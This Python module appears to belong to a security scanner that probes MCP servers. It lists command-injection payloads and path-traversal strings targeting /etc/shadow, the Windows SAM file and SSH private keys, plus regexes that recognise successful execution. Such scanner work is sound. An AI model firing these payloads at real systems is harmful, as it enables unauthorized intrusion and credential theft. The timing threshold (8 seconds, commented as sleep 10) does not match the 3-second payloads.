"""MCP Attack Payloads - Semantic exploitation vectors."""
import re
import statistics

# Prioritized payload categories (RCE first).
PAYLOAD_PRIORITY = ["command_injection"]

# Quick RCE-only mode payloads.
RCE_QUICK_PAYLOADS = [
    "; id", "| id", "$(id)", "`id`",
    "; whoami", "| whoami",
    "& whoami", "&& whoami",
    "; sleep 3", "$(sleep 3)",
]

PAYLOADS = {
    "command_injection": [
        # Unix RCE - fast detection.  Newline injection is placed early
        # because leading ';' / '|' are syntax errors in POSIX sh.
        "; id", "| id", "\nid", "`id`", "$(id)",
        "; whoami", "| whoami", "\nwhoami", "`whoami`", "$(whoami)",
        "; uname -a", "| uname -a", "\nuname -a",
        # Windows RCE
        "& whoami", "&& whoami", "| whoami",
        "& ver", "&& ver",
        # Blind RCE (timing) - run only with explicit destructive opt-in
        "; sleep 3", "| sleep 3", "`sleep 3`", "$(sleep 3)",
        "& timeout 3", "&& timeout 3",
        # File read for RCE confirmation
        "; cat /etc/passwd", "| cat /etc/passwd",
        "$(cat /etc/passwd)", "`cat /etc/passwd`",
    ],
    "path_traversal": [
        "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
        "file:///etc/shadow", "....//....//etc/passwd",
        "/etc/passwd", "C:\\Windows\\System32\\config\\SAM",
        "../../../../../../root/.ssh/id_rsa",
    ],
    "blind_timing": [
        "; sleep 3", "| sleep 3", "$(sleep 3)", "`sleep 3`",
    ],
}

#: Aliases keep the public ``target_type`` vocabulary stable while the payload
#: table uses explicit category names.  Earlier versions mapped ``traversal``
#: to a non-existent ``rce`` key and silently tested nothing.
PAYLOAD_ALIASES = {
    "rce": "command_injection",
    "command": "command_injection",
    "traversal": "path_traversal",
    "path": "path_traversal",
    "path_traversal": "path_traversal",
    "command_injection": "command_injection",
    "blind_timing": "blind_timing",
    "timing": "blind_timing",
}

# Pre-compiled regex patterns for RCE detection.
INDICATORS = {
    "rce_success": [
        # Unix command output
        re.compile(r"uid=\d+\([^)]+\)"),  # id output
        re.compile(r"gid=\d+\([^)]+\)"),
        re.compile(r"groups=\d+"),
        re.compile(r"root:.*:0:0"),  # /etc/passwd
        re.compile(r"\broot\b.*\b/bin/bash"),
        re.compile(r"Linux.*\d+\.\d+\.\d+"),  # uname -a
        re.compile(r"GNU/Linux"),
        # Windows command output
        re.compile(r"COMPUTERNAME=", re.IGNORECASE),
        re.compile(r"USERNAME=", re.IGNORECASE),
        re.compile(r"Windows.*Version", re.IGNORECASE),
        re.compile(r"Microsoft Windows", re.IGNORECASE),
        re.compile(r"C:\\Windows", re.IGNORECASE),
        re.compile(r"C:\\Users", re.IGNORECASE),
    ],
    "file_read": [
        re.compile(r"root:x:"),
        re.compile(r"-----BEGIN"),
        re.compile(r"\[boot loader\]"),
        re.compile(r"PRIVATE KEY"),
    ],
}


class TimingAnalyzer:
    """Statistical timing analysis for blind RCE detection.

    Kept for API compatibility.  New code should use
    :class:`core.baseline.LatencyBaseline`, which requires a control sample and
    never turns a timing observation into a confirmed exploit.
    """

    def __init__(self):
        self.baseline_times = []
        self.threshold_sigma = 3
        self.blind_rce_threshold = 8.0  # sleep 10 detection

    def add_baseline(self, elapsed_time):
        self.baseline_times.append(elapsed_time)

    def is_anomaly(self, elapsed_time):
        # Absolute threshold for sleep-based RCE
        if elapsed_time > self.blind_rce_threshold:
            return True
        if len(self.baseline_times) < 3:
            return False
        try:
            avg = statistics.mean(self.baseline_times)
            stdev = statistics.stdev(self.baseline_times)
            if stdev == 0:
                return elapsed_time > avg * 2  # Fallback heuristic
            return elapsed_time > avg + (self.threshold_sigma * stdev)
        except statistics.StatisticsError:
            return False
